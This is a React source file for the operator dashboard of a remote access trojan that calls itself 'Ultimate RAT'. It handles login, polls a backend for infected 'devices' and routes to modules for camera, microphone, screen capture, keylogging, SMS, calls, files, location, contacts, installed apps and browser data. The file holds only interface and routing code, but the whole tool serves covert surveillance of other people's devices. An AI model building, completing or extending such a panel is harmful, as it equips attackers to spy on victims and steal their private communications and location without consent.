import React, { useEffect, useState } from 'react';
import { Routes, Route, Navigate } from 'react-router-dom';
import { useDeviceStore } from './store/deviceStore';
import { useSocket } from './hooks/useSocket';
import { useQuery } from '@tanstack/react-query';
import axios from 'axios';
import toast from 'react-hot-toast';

// Components
import Sidebar from './components/Layout/Sidebar';
import Topbar from './components/Layout/Topbar';
import MainPanel from './components/Layout/MainPanel';
import Login from './components/Auth/Login';
import Dashboard from './components/Dashboard/Dashboard';
import Camera from './components/Camera/Camera';
import Microphone from './components/Microphone/Microphone';
import Screen from './components/Screen/Screen';
import Keylogger from './components/Keylogger/Keylogger';
import SMS from './components/SMS/SMS';
import Calls from './components/Calls/Calls';
import Files from './components/Files/Files';
import Location from './components/Location/Location';
import Contacts from './components/Contacts/Contacts';
import Apps from './components/Apps/Apps';
import Browser from './components/Browser/Browser';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000';

function App() {
  const { user, setUser, setAuthToken, initSocket, setDevices, setStats } = useDeviceStore();
  const { isConnected } = useSocket();
  const [loading, setLoading] = useState(true);

  // Check auth on mount
  useEffect(() => {
    const token = localStorage.getItem('authToken');
    const storedUser = localStorage.getItem('user');
    
    if (token && storedUser) {
      setAuthToken(token);
      setUser(JSON.parse(storedUser));
      initSocket();
    }
    
    setLoading(false);
  }, []);

  // Fetch devices
  const { data: devices } = useQuery({
    queryKey: ['devices'],
    queryFn: async () => {
      const response = await axios.get(`${API_URL}/api/devices`, {
        headers: { Authorization: `Bearer ${localStorage.getItem('authToken')}` },
      });
      return response.data;
    },
    enabled: !!user,
    refetchInterval: 5000,
  });

  // Fetch stats
  const { data: stats } = useQuery({
    queryKey: ['stats'],
    queryFn: async () => {
      const response = await axios.get(`${API_URL}/api/devices/stats`, {
        headers: { Authorization: `Bearer ${localStorage.getItem('authToken')}` },
      });
      return response.data;
    },
    enabled: !!user,
    refetchInterval: 10000,
  });

  useEffect(() => {
    if (devices) {
      setDevices(devices);
    }
  }, [devices]);

  useEffect(() => {
    if (stats) {
      setStats(stats);
    }
  }, [stats]);

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-primary/30 border-t-primary rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-textMuted">Loading Ultimate RAT...</p>
        </div>
      </div>
    );
  }

  return (
    <Routes>
      <Route path="/login" element={!user ? <Login /> : <Navigate to="/" />} />
      <Route
        path="/"
        element={user ? (
          <div className="flex h-screen bg-background overflow-hidden">
            <Sidebar />
            <div className="flex-1 flex flex-col overflow-hidden">
              <Topbar />
              <MainPanel />
            </div>
          </div>
        ) : <Navigate to="/login" />}
      >
        <Route index element={<Dashboard />} />
        <Route path="camera" element={<Camera />} />
        <Route path="microphone" element={<Microphone />} />
        <Route path="screen" element={<Screen />} />
        <Route path="keylogger" element={<Keylogger />} />
        <Route path="sms" element={<SMS />} />
        <Route path="calls" element={<Calls />} />
        <Route path="files" element={<Files />} />
        <Route path="location" element={<Location />} />
        <Route path="contacts" element={<Contacts />} />
        <Route path="apps" element={<Apps />} />
        <Route path="browser" element={<Browser />} />
      </Route>
    </Routes>
  );
}

export default App;